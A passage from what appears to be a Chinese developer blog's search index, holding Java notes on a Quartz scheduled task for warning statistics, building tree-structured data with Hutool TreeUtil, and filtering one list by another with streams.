punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">exportExcel</span><span class="token punctuation">(</span><span class="token string">"sheetName"</span><span class="token punctuation">,</span> <span class="token string">"title"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Excel </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Excel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>定时任务</title>
      <link href="/2021/11/01/ding-shi-ren-wu/"/>
      <url>/2021/11/01/ding-shi-ren-wu/</url>
      
        <content type="html"><![CDATA[<h1 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h1><p>本地调试参考：<a href="https://www.cnblogs.com/mmzs/p/10161936.html">https://www.cnblogs.com/mmzs/p/10161936.html</a></p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>quartz<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>baomidou<span class="token punctuation">.</span>dynamic<span class="token punctuation">.</span>datasource<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>DS<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>common<span class="token punctuation">.</span>core<span class="token punctuation">.</span>controller<span class="token punctuation">.</span>BaseController<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>common<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>StringUtils<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>entity<span class="token punctuation">.</span>WarningRecord<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>entity<span class="token punctuation">.</span>WarningStatistics<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>mapper<span class="token punctuation">.</span>WarningRecordMapper<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>mapper<span class="token punctuation">.</span>WarningRulesMapper<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>mapper<span class="token punctuation">.</span>WarningStatisticsMapper<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>model<span class="token punctuation">.</span>FindNamesBody<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>service<span class="token punctuation">.</span>WarningStatisticsService<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>lang3<span class="token punctuation">.</span>time<span class="token punctuation">.</span>DateFormatUtils<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>lang3<span class="token punctuation">.</span>time<span class="token punctuation">.</span>DateUtils<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span>Component<span class="token punctuation">;</span><span class="token keyword">import</span> tk<span class="token punctuation">.</span>mybatis<span class="token punctuation">.</span>mapper<span class="token punctuation">.</span>entity<span class="token punctuation">.</span>Example<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Resource<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ArrayList<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Arrays<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Date<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>Collectors<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * 预警统计定时任务调度 * * @author ChenZhiMing */</span><span class="token annotation punctuation">@Component</span><span class="token punctuation">(</span><span class="token string">"ryWarningStatistics"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@DS</span><span class="token punctuation">(</span><span class="token string">"XYYJ"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RyWarningStatistics</span> <span class="token keyword">extends</span> <span class="token class-name">BaseController</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Resource</span>    <span class="token keyword">private</span> WarningRecordMapper warningRecordMapper<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Resource</span>    <span class="token keyword">private</span> WarningStatisticsService warningStatisticsService<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Resource</span>    <span class="token keyword">private</span> WarningRulesMapper warningRulesMapper<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Resource</span>    <span class="token keyword">private</span> WarningStatisticsMapper warningStatisticsMapper<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 根据月或日统计     *     * @param type:     * @return     */</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">warningStatistics</span><span class="token punctuation">(</span>String type<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Date date <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Example example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">(</span>WarningRecord<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Example<span class="token punctuation">.</span>Criteria criteria <span class="token operator">=</span> example<span class="token punctuation">.</span><span class="token function">createCriteria</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        WarningStatistics warningStatistics <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WarningStatistics</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        criteria<span class="token punctuation">.</span><span class="token function">andGreaterThanOrEqualTo</span><span class="token punctuation">(</span><span class="token string">"createTime"</span><span class="token punctuation">,</span> DateFormatUtils<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>date<span class="token punctuation">,</span> <span class="token string">"yyyy-MM-dd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        criteria<span class="token punctuation">.</span><span class="token function">andLessThan</span><span class="token punctuation">(</span><span class="token string">"createTime"</span><span class="token punctuation">,</span> DateFormatUtils<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>DateUtils<span class="token punctuation">.</span><span class="token function">addDays</span><span class="token punctuation">(</span>date<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"yyyy-MM-dd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        List<span class="token operator">&lt;</span>WarningRecord<span class="token operator">></span> warningRecordsList <span class="token operator">=</span> warningRecordMapper<span class="token punctuation">.</span><span class="token function">selectByExample</span><span class="token punctuation">(</span>example<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>warningRecordsList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"日"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>warningRecordsList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    warningStatistics<span class="token punctuation">.</span><span class="token function">setUserId</span><span class="token punctuation">(</span>warningRecordsList<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRecordPersonId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    warningStatistics<span class="token punctuation">.</span><span class="token function">setWarningStatisticsTime</span><span class="token punctuation">(</span>date<span class="token punctuation">)</span><span class="token punctuation">;</span>                    warningStatistics<span class="token punctuation">.</span><span class="token function">setWarningStatisticsType</span><span class="token punctuation">(</span><span class="token string">"日"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    warningStatistics<span class="token punctuation">.</span><span class="token function">setWarningStatisticsName</span><span class="token punctuation">(</span><span class="token string">"统计名称"</span> <span class="token operator">+</span> DateFormatUtils<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>date<span class="token punctuation">,</span> <span class="token string">"yyyyMMddHHmmss"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">//根据规则id查预警纬度名称、预警规则名称、预警类型名称</span>                    List<span class="token operator">&lt;</span>FindNamesBody<span class="token operator">></span> names <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span>WarningRecord warningRecord <span class="token operator">:</span> warningRecordsList<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        names<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>warningRulesMapper<span class="token punctuation">.</span><span class="token function">findNames</span><span class="token punctuation">(</span>warningRecord<span class="token punctuation">.</span><span class="token function">getRecordRulesId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token comment" spellcheck="true">//转换、去重</span>                    List<span class="token operator">&lt;</span>String<span class="token operator">></span> warningResultName <span class="token operator">=</span> names<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">distinct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>resultName <span class="token operator">-</span><span class="token operator">></span> resultName<span class="token punctuation">.</span><span class="token function">getRulesName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>Collectors<span class="token punctuation">.</span><span class="token function">toList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    List<span class="token operator">&lt;</span>String<span class="token operator">></span> warningTypeList <span class="token operator">=</span> names<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>typeName <span class="token operator">-</span><span class="token operator">></span> typeName<span class="token punctuation">.</span><span class="token function">getWarningTypeName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">distinct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>Collectors<span class="token punctuation">.</span><span class="token function">toList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    List<span class="token operator">&lt;</span>String<span class="token operator">></span> warningLatitudeList <span class="token operator">=</span> names<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>latitudeName <span class="token operator">-</span><span class="token operator">></span> latitudeName<span class="token punctuation">.</span><span class="token function">getLatitudeName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">distinct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>Collectors<span class="token punctuation">.</span><span class="token function">toList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    warningStatistics<span class="token punctuation">.</span><span class="token function">setWarningStatisticsLatitude</span><span class="token punctuation">(</span>warningResultName<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> warningTypeList <span class="token operator">+</span> warningLatitudeList<span class="token punctuation">)</span><span class="token punctuation">;</span>                    warningStatistics<span class="token punctuation">.</span><span class="token function">setWarningStatisticsCount</span><span class="token punctuation">(</span>warningRecordsList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    warningStatistics<span class="token punctuation">.</span><span class="token function">setCreateTime</span><span class="token punctuation">(</span>date<span class="token punctuation">)</span><span class="token punctuation">;</span>                    warningStatisticsService<span class="token punctuation">.</span><span class="token function">addWarningStatistics</span><span class="token punctuation">(</span>warningStatistics<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"月"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//查统计表中的本月日统计</span>                Example exampleStatistic <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">(</span>WarningStatistics<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                exampleStatistic<span class="token punctuation">.</span><span class="token function">createCriteria</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">andEqualTo</span><span class="token punctuation">(</span><span class="token string">"warningStatisticsType"</span><span class="token punctuation">,</span> <span class="token string">"日"</span><span class="token punctuation">)</span>                        <span class="token punctuation">.</span><span class="token function">andGreaterThanOrEqualTo</span><span class="token punctuation">(</span><span class="token string">"createTime"</span><span class="token punctuation">,</span> DateFormatUtils<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>date<span class="token punctuation">,</span> <span class="token string">"yyyy-MM"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token punctuation">.</span><span class="token function">andLessThan</span><span class="token punctuation">(</span><span class="token string">"createTime"</span><span class="token punctuation">,</span> DateFormatUtils<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>DateUtils<span class="token punctuation">.</span><span class="token function">addMonths</span><span class="token punctuation">(</span>date<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"yyyy-MM"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                List<span class="token operator">&lt;</span>WarningStatistics<span class="token operator">></span> warningStatisticsList <span class="token operator">=</span> warningStatisticsMapper<span class="token punctuation">.</span><span class="token function">selectByExample</span><span class="token punctuation">(</span>exampleStatistic<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//赋值</span>                warningStatistics<span class="token punctuation">.</span><span class="token function">setUserId</span><span class="token punctuation">(</span>warningStatisticsList<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getUserId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                warningStatistics<span class="token punctuation">.</span><span class="token function">setWarningStatisticsTime</span><span class="token punctuation">(</span>date<span class="token punctuation">)</span><span class="token punctuation">;</span>                warningStatistics<span class="token punctuation">.</span><span class="token function">setWarningStatisticsType</span><span class="token punctuation">(</span><span class="token string">"月"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                warningStatistics<span class="token punctuation">.</span><span class="token function">setWarningStatisticsName</span><span class="token punctuation">(</span><span class="token string">"统计名称"</span> <span class="token operator">+</span> DateFormatUtils<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>date<span class="token punctuation">,</span> <span class="token string">"yyyyMMddHHmmss"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//处理预警统计纬度</span>                List<span class="token operator">&lt;</span>String<span class="token operator">></span> collect <span class="token operator">=</span> warningStatisticsList<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>WarningStatistics<span class="token operator">:</span><span class="token operator">:</span>getWarningStatisticsLatitude<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">distinct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>Collectors<span class="token punctuation">.</span><span class="token function">toList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                String<span class="token punctuation">[</span><span class="token punctuation">]</span> split <span class="token operator">=</span> collect<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"\\[|\\]|,"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                List<span class="token operator">&lt;</span>String<span class="token operator">></span> collect1 <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span>split<span class="token punctuation">)</span>                        <span class="token punctuation">.</span><span class="token function">distinct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                        <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>s <span class="token operator">-</span><span class="token operator">></span> s<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>s <span class="token operator">-</span><span class="token operator">></span> <span class="token operator">!</span>StringUtils<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>Collectors<span class="token punctuation">.</span><span class="token function">toList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                warningStatistics<span class="token punctuation">.</span><span class="token function">setWarningStatisticsLatitude</span><span class="token punctuation">(</span>collect1<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                warningStatistics<span class="token punctuation">.</span><span class="token function">setWarningStatisticsCount</span><span class="token punctuation">(</span>warningRecordsList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                warningStatistics<span class="token punctuation">.</span><span class="token function">setCreateTime</span><span class="token punctuation">(</span>date<span class="token punctuation">)</span><span class="token punctuation">;</span>                warningStatisticsService<span class="token punctuation">.</span><span class="token function">addWarningStatistics</span><span class="token punctuation">(</span>warningStatistics<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="/images/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A12.png"></p><ul><li><p>在任务类中测试</p><p><img src="/images/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A13.png"></p></li></ul><p><img src="/images/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A14.png"></p>]]></content>
      
      
      <categories>
          
          <category> 定时任务 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java返回树形结构数据</title>
      <link href="/2021/10/16/java-shu-xing-jie-gou-shu-ju/"/>
      <url>/2021/10/16/java-shu-xing-jie-gou-shu-ju/</url>
      
        <content type="html"><![CDATA[<h1 id="返回树形结构的数据"><a href="#返回树形结构的数据" class="headerlink" title="返回树形结构的数据"></a>返回树形结构的数据</h1><h2 id="使用Hutool-TreeUtil-实现"><a href="#使用Hutool-TreeUtil-实现" class="headerlink" title="使用Hutool TreeUtil 实现"></a>使用Hutool TreeUtil 实现</h2><pre><code>https://blog.csdn.net/XikYu/article/details/128715929?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_utm_term~default-0-128715929-blog-127101547.pc_relevant_3mothn_strategy_recovery&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3</code></pre><pre class=" language-java"><code class="language-java">    <span class="token comment" spellcheck="true">/**     * 树形结构数据     *     * @Author: CZM     * @Param: []     */</span>    <span class="token keyword">public</span> List<span class="token operator">&lt;</span>Tree<span class="token operator">&lt;</span>String<span class="token operator">>></span> <span class="token function">findNodeAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        List<span class="token operator">&lt;</span>IndustryNode<span class="token operator">></span> list <span class="token operator">=</span> industryNodeMapper<span class="token punctuation">.</span><span class="token function">selectAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        List<span class="token operator">&lt;</span>IndustryNode<span class="token operator">></span> list2 <span class="token operator">=</span> CollUtil<span class="token punctuation">.</span><span class="token function">newArrayList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//浅拷贝赋值</span>        list2<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// rootId</span>        String pid <span class="token operator">=</span> <span class="token string">"0"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//配置</span>        TreeNodeConfig nodeConfig <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeNodeConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 自定义属性名 都要默认值的</span>        <span class="token comment" spellcheck="true">//设置ID对应的名称</span>        nodeConfig<span class="token punctuation">.</span><span class="token function">setIdKey</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 最大递归深度 4级目录</span>        nodeConfig<span class="token punctuation">.</span><span class="token function">setDeep</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//转换器</span>        List<span class="token operator">&lt;</span>Tree<span class="token operator">&lt;</span>String<span class="token operator">>></span> treeList <span class="token operator">=</span> TreeUtil<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span>list2<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> nodeConfig<span class="token punctuation">,</span>                <span class="token punctuation">(</span>node<span class="token punctuation">,</span> tree<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">//id</span>                    tree<span class="token punctuation">.</span><span class="token function">setId</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">//名称</span>                    tree<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span><span class="token function">getTagName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">//获取父节点id</span>                    tree<span class="token punctuation">.</span><span class="token function">setParentId</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span><span class="token function">getParentId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Tree<span class="token operator">&lt;</span>String<span class="token operator">></span> tree <span class="token operator">:</span> treeList<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">setLevel</span><span class="token punctuation">(</span>tree<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> treeList<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 设置层级     *     * @Author: CZM     * @Param: [tree, level]     */</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setLevel</span><span class="token punctuation">(</span>Tree<span class="token operator">&lt;</span>String<span class="token operator">></span> tree<span class="token punctuation">,</span> <span class="token keyword">int</span> level<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>tree <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        tree<span class="token punctuation">.</span><span class="token function">putExtra</span><span class="token punctuation">(</span><span class="token string">"level"</span><span class="token punctuation">,</span> level<span class="token punctuation">)</span><span class="token punctuation">;</span>        List<span class="token operator">&lt;</span>Tree<span class="token operator">&lt;</span>String<span class="token operator">>></span> children <span class="token operator">=</span> tree<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>children <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>Tree<span class="token operator">&lt;</span>String<span class="token operator">></span> child <span class="token operator">:</span> children<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">setLevel</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> level <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> 树形结构数据 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>根据List过滤List</title>
      <link href="/2021/10/15/gen-ju-list-guo-lu-list/"/>
      <url>/2021/10/15/gen-ju-list-guo-lu-list/</url>
      
        <content type="html"><![CDATA[<h1 id="list根据list过滤"><a href="#list根据list过滤" class="headerlink" title="list根据list过滤"></a>list根据list过滤</h1><pre class=" language-java"><code class="language-java">List<span class="token operator">&lt;</span>User<span class="token operator">></span> resList <span class="token operator">=</span> list1 <span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Predicate</span><span class="token operator">&lt;</span>User<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>           <span class="token annotation punctuation">@Override</span>           <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">test</span><span class="token punctuation">(</span>User u<span class="token punctuation">)</span> <span class="token punctuation">{</span>               <span class="token comment" spellcheck="true">//如根据name过滤</span>               <span class="token keyword">for</span> <span class="token punctuation">(</span>User user <span class="token operator">:</span> list2<span class="token punctuation">)</span> <span class="token punctuation">{</span>                   <span class="token keyword">if</span><span class="token punctuation">(</span>u<span class="token 